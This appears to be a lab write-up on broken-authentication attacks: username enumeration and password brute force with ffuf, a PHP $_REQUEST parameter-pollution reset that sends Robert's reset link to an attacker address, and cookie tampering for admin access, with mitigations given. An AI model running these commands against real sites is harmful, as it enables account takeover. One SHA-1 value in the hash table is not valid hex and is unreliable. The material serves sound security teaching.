# Broken Authentication

## Overview

Authentication is the process by which a web application verifies that a user is who they claim to be. Broken authentication describes any class of attack that allows access to a restricted account without supplying the correct credential. This room covers the four most common attack patterns: username enumeration, credential brute force, logic flaws in account recovery workflows, and cookie manipulation. Each targets a different component of the authentication stack and requires a different approach to detect, exploit, and fix.

**Main objectives:** Use ffuf to enumerate valid usernames via response differentiation, brute-force a valid credential pair, exploit a PHP `$_REQUEST` parameter pollution flaw to redirect a password reset email, and manipulate plain-text, hashed, and base64-encoded cookies.

**Skills introduced:** ffuf username enumeration with `-mr` matching, multi-wordlist ffuf brute force with `-fc` filtering, `curl` for parameter pollution exploitation, MD5 hash identification and manipulation, base64 cookie decoding and re-encoding, and cookie-based privilege escalation.

---

## Concepts Covered

### The Four Authentication Attack Categories

| Attack | Target | Output |
|--------|--------|--------|
| **Username enumeration** | Signup/reset forms that distinguish registered vs unregistered values | List of valid accounts |
| **Credential brute force** | Login form with no rate limiting | Working username:password pair |
| **Logic flaw** | Password reset workflow that splits inputs across multiple sources | Account takeover without credentials |
| **Cookie manipulation** | Session cookies not protected by cryptographic signing | Elevated session privileges |

**Use cases and impact:**
- Access a specific user's data and functionality
- Gain admin access to control the application
- First step in a longer attack chain (account → lateral movement → privilege escalation)
- Credential reuse via stuffing across unrelated applications

---

### Username Enumeration

**Definition:** Using a signup or reset form's different responses for registered vs unregistered values to confirm which accounts exist on the application.

**Why it matters:** Before brute-forcing, you need a short, high-quality list of real accounts. Enumerating first reduces the attack from thousands of guesses to tens of targeted attempts.

**Where it occurs:**
- Signup forms: "This username already exists"
- Login forms: "Wrong password" vs "Unknown user" (revealing the account exists)
- Password reset forms: "Email not found" vs "Reset email sent"

The differentiation is not always in the response body. It may be in status code, response length, redirect behaviour, or response timing.

**Tool: ffuf**

ffuf (Fuzz Faster U Fool) is a fast Go-based fuzzer. It substitutes wordlist values into a request template and filters results based on specified conditions.

**Enumeration command:**
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://TARGET/customers/signup \
     -mr "username already exists"
```

**Flag breakdown:**
- `-w` — wordlist of candidate usernames
- `-X POST` — HTTP method
- `-d` — POST body; `FUZZ` is replaced by each wordlist entry in turn
- `-H` — set Content-Type header so the server parses the body as form data
- `-u` — target URL
- `-mr` — match regex; only display responses whose body contains this string

**Output:** A list of usernames that triggered the "username already exists" message — these are registered accounts. Save to `valid_usernames.txt`.

---

### Credential Brute Force

**Definition:** Submitting every username/password combination from a dictionary until a valid pair is found. Only practical when the username list is short (from enumeration) and the application has no rate limiting or lockout.

**Success condition:** The login form returns HTTP 200 on failure (re-renders login page) and HTTP 302 on success (redirects to dashboard). Other signals include response body differences, new cookies, or redirect URLs.

**Multi-wordlist ffuf command:**
```bash
ffuf -w valid_usernames.txt:W1,\
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST \
     -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://TARGET/customers/login \
     -fc 200
```

**Flag breakdown:**
- `-w wordlist1:W1,wordlist2:W2` — bind two wordlists to named markers
- `username=W1&password=W2` — use both markers in the POST body
- `-fc 200` — filter code; discard responses with HTTP 200 (failed login); display only non-200 (successful login)

**Why filter 200 instead of matching 302?** It is more reliable to discard the known-failure responses than to match a specific success indicator, particularly when the success redirect may vary.

---

### Logic Flaws — Password Reset Parameter Pollution

**Definition:** A logic flaw is a vulnerability where valid input drives the application through an unintended decision path. Unlike injection, the input is well-formed — the issue is in the business logic.

**The specific flaw here:** PHP's `$_REQUEST` superglobal merges the query string, POST body, and cookies into a single array. When the same key appears in multiple sources, POST body values override query string values by default.

**The password reset workflow:**
- Step 1: User submits their email address (in query string)
- Step 2: User submits their username (in POST body)
- The server looks up the account by the query string `email` parameter
- The server **composes the outgoing reset email using `$_REQUEST['email']`** — which pulls from POST body if that key is present

**Legitimate request (curl):**
```bash
curl 'http://TARGET/customers/reset?email=robert%40acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert'
```

**Exploited request — inject second email parameter in POST body:**
```bash
curl 'http://TARGET/customers/reset?email=robert%40acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email=attacker@hacker.com'
```

**What happens:**
1. Server reads query string `email=robert@acmeitsupport.thm` → confirms account exists
2. Server calls `$_REQUEST['email']` to get the address for the reset email
3. `$_REQUEST` returns `attacker@hacker.com` (POST body overrides query string)
4. Reset link is sent to the attacker's address

**Attack to get Robert's flag:**
```bash
curl 'http://TARGET/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email={your_customer_username}@customer.acmeitsupport.thm'
```

**Why the internal inbox:** Every customer gets an internal address at `{username}@customer.acmeitsupport.thm`. Mail sent there appears as a support ticket on the customer's account. The reset link arrives as a ticket, which can be followed to authenticate as Robert and read his flag.

**Root cause:** The developer used `$_REQUEST` (which merges multiple sources) instead of explicitly reading from a single trusted source (`$_GET` or `$_POST`). The identity check and the email composition read from different sources, and the attacker can desynchronise them.

---

### Cookie Manipulation

**Definition:** Modifying session cookies that are not cryptographically signed to change the authentication decision the server makes on the next request.

**Three common vulnerable cookie formats:**

#### 1. Plain Text Cookies
State is stored directly as readable values:
```
Set-Cookie: logged_in=true; Max-Age=3600; Path=/
Set-Cookie: admin=false; Max-Age=3600; Path=/
```

**Exploitation:**
```bash
# Default — logged out
curl http://TARGET/cookie-test

# Logged in as regular user
curl -H "Cookie: logged_in=true; admin=false" http://TARGET/cookie-test

# Logged in as admin (modify admin=false to admin=true)
curl -H "Cookie: logged_in=true; admin=true" http://TARGET/cookie-test
```

No signature check means the server accepts whatever cookie values the client sends.

#### 2. Hashed Cookies
A hash of the underlying value is stored instead of the value itself:
```
Set-Cookie: admin=c4ca4238a0b923820dcc509a6f75849b
```

**The false assumption:** Developers sometimes think an MD5 hash is tamper-resistant because it cannot be reversed. It is not tamper-resistant — **anyone who knows or guesses the original value can produce the same hash independently**.

**Hash lookup process:**
1. Identify the algorithm by output length: MD5 = 32 hex characters
2. Note the hash value: `c4ca4238a0b923820dcc509a6f75849b`
3. Look up at CrackStation.net → decodes to `1`
4. Hash the target value: MD5(`1`) = `c4ca4238a0b923820dcc509a6f75849b` (same)
5. Hash the value you want: MD5(`true`) = known value
6. Substitute the new hash in the cookie

**Common hashes for quick reference:**

| Original | MD5 | SHA-1 |
|----------|-----|-------|
| `1` | `c4ca4238a0b923820dcc509a6f75849b` | `356a192b7913b04c54574d18c28d46e6395428ab` |
| `true` | `b326b5062b2f0e69046810717534cb09` | `5ffe533b830f08a0326348a9160afafc8ada44db` |
| `false` | `68934a3e9455fa72420237eb05902327` | `7cb6efb98ba5fkf27e8a4d46f3eff10f08bbd507` |
| `admin` | `21232f297a57a5a743894a0e4a801fc3` | `d033e22ae348aeb5660fc2140aec35850c4da997` |

#### 3. Base64-Encoded Cookies
A reversibly encoded structured payload (JSON) is stored as the cookie:

```
Set-Cookie: session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
```

**Decode:**
```bash
echo 'eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==' | base64 -d
# Output: {"id":1,"admin":false}
```

**Modify and re-encode:**
```bash
echo -n '{"id":1,"admin":true}' | base64
# Output: eyJpZCI6MSwiYWRtaW4iOnRydWV9
```

**Substitute the new value in the cookie.** The server decodes it and reads `"admin": true`. No signature means no detection.

---

## Methodology

```
1. Username Enumeration:
   - Find forms that handle username/email input (signup, login, password reset)
   - Submit a known-registered value (e.g., "admin") and observe response
   - Submit a clearly non-existent value and observe response
   - If responses differ → enumerable
   - Run ffuf with -mr against the differentiating string
   - Save results to valid_usernames.txt

2. Credential Brute Force:
   - Confirm how the login form signals success vs failure (200 vs 302, or body text)
   - Run ffuf with two wordlists (usernames:W1, passwords:W2)
   - Filter out the failure response code with -fc
   - Note the successful credential pair

3. Logic Flaw Testing:
   - Map all authentication-adjacent workflows (login, signup, password reset, email change)
   - Identify where inputs are split across query string + POST body
   - Test: place a conflicting value of the same key in the POST body
   - Observe whether the POST body value overrides the query string value
   - Use curl for precise control over both parameter positions

4. Cookie Manipulation:
   - Inspect all cookies with browser DevTools → Application → Cookies
   - Identify cookie format: plain text, hash, encoded?
   - For hashes: identify algorithm (length), look up at CrackStation, hash your target value
   - For base64: decode, modify JSON/payload, re-encode, substitute
   - Send modified cookie via Burp or curl
   - Observe if access level changes
```

---

## Practical Activities

### Activity 1 — Username Enumeration

**Command:**
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://TARGET/customers/signup \
     -mr "username already exists"
```

**Finding:** Several usernames (e.g., `admin`, `robert`, `simon`) returned the "username already exists" message, confirming they are registered accounts. Saved to `valid_usernames.txt`.

---

### Activity 2 — Credential Brute Force

**Command:**
```bash
ffuf -w valid_usernames.txt:W1,\
/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://TARGET/customers/login -fc 200
```

**Finding:** One combination did not return HTTP 200 — the unique non-filtered result is the valid credential pair.

---

### Activity 3 — Parameter Pollution Reset Attack

**Command:**
```bash
curl 'http://TARGET/customers/reset?email=robert%40acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email={your_username}@customer.acmeitsupport.thm'
```

**Finding:** Reset link arrived as a support ticket on the attacker's customer account. Following the link authenticated as Robert, exposing his support tickets including the flag.

**Why it worked:** `$_REQUEST['email']` in the server's email composition step read from POST body, not the query string. Adding `email=` to the POST body silently overrode the legitimate address.

---

### Activity 4 — Cookie Manipulation

**Plain text cookie escalation:**
```bash
curl -H "Cookie: logged_in=true; admin=true" http://TARGET/cookie-test
# Returns: Logged In As An Admin + flag
```

**MD5 cookie manipulation:**
- Identify the cookie value is an MD5 hash
- Look up `c4ca4238a0b923820dcc509a6f75849b` at CrackStation → `1` (representing a privilege level)
- Hash the desired value (e.g., `5` for admin) → substitute in cookie

**Base64 cookie manipulation:**
```bash
# Decode
echo 'eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==' | base64 -d
# → {"id":1,"admin":false}

# Modify and re-encode
echo -n '{"id":1,"admin":true}' | base64
# → eyJpZCI6MSwiYWRtaW4iOnRydWV9

# Submit modified cookie
curl -H "Cookie: session=eyJpZCI6MSwiYWRtaW4iOnRydWV9" http://TARGET/admin
```

---

## Observations and Analysis

- Username enumeration via signup forms is particularly reliable because signup forms must tell users that a username is taken — there is no secure way to avoid this completely other than using email-as-username with a "we sent a confirmation email" pattern that is identical for both registered and unregistered addresses
- The parameter pollution flaw demonstrates that using `$_REQUEST` in PHP for any security-relevant operation is inherently dangerous — it merges untrusted input from multiple channels
- Hashed cookies provide a false sense of security — hashing without a secret (HMAC) is just encoding with extra steps, not a signature
- Base64 is encoding, not encryption — it provides zero confidentiality or integrity
- None of these attacks require XSS or any other secondary vulnerability — they exploit the authentication mechanism directly

---

## Mitigations Summary

| Attack | Mitigation |
|--------|-----------|
| Username enumeration | Return identical responses for registered and unregistered values; use email-based flow with uniform "check your email" message |
| Brute force | Rate limiting; account lockout; CAPTCHA; MFA (most effective) |
| Logic flaw | Read each parameter from exactly one explicit source (`$_GET`, `$_POST`, `$_COOKIE` — not `$_REQUEST`) |
| Cookie tampering | Sign cookies with HMAC or use opaque session IDs + server-side session store; hashing is not a signature |

---

## Tools and Technologies Used

### ffuf
- **Purpose:** Fast web fuzzer — substitutes wordlist values into HTTP requests and filters results
- **Key flags:** `-w` (wordlist), `-X` (method), `-d` (body), `-H` (header), `-u` (URL), `-mr` (match regex), `-fc` (filter code)

### curl
- **Purpose:** Command-line HTTP client for crafting precise requests with specific headers and body content
- **How used:** Parameter pollution exploit — precise control over both query string and POST body simultaneously

### CrackStation (crackstation.net)
- **Purpose:** Precomputed hash lookup — identify plaintext values behind MD5, SHA-1, SHA-256 hashes
- **How used:** Identified that MD5 hash `c4ca4238a0b923820dcc509a6f75849b` = `1`

---

## Things Worth Remembering

- ffuf username enumeration: `-mr "differentiating string"` to match the error message
- ffuf brute force: `-w list1:W1,list2:W2` and use W1/W2 in body template; `-fc 200` filters failures
- Parameter pollution: POST body overrides query string in PHP `$_REQUEST`
- Never use `$_REQUEST` for security checks — use `$_GET`, `$_POST`, `$_COOKIE` explicitly
- MD5 = 32 hex chars; SHA-1 = 40; SHA-256 = 64
- Hashing ≠ signing — without a secret key, any party can produce the same hash
- Base64 decode: `echo 'VALUE' | base64 -d`; encode: `echo -n 'VALUE' | base64`
- Cookie tampering prevention: HMAC signing or opaque session ID with server-side state store

---

## Conclusion

Broken authentication vulnerabilities demonstrate that bypassing an authentication mechanism rarely requires attacking the cryptography directly. The most common path is exploiting the assumptions built into the workflow: that a signup form's error message only you see, that a form's reset request carries its parameters from a single source, and that encoding or hashing a value makes it tamper-resistant. This room built the four core attack skills — enumeration, brute force, logic exploitation, and cookie manipulation — that form the baseline authentication testing methodology for every web application assessment.
